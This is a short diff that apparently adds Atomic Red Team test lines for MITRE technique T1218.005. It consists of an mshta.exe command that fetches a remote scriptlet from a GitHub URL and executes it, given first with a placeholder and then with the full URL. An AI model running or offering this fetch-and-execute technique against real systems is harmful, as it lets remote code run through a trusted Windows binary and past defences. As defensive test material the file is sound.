@@ -1,0 +1,4 @@
+mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
+https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct
+
+mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();
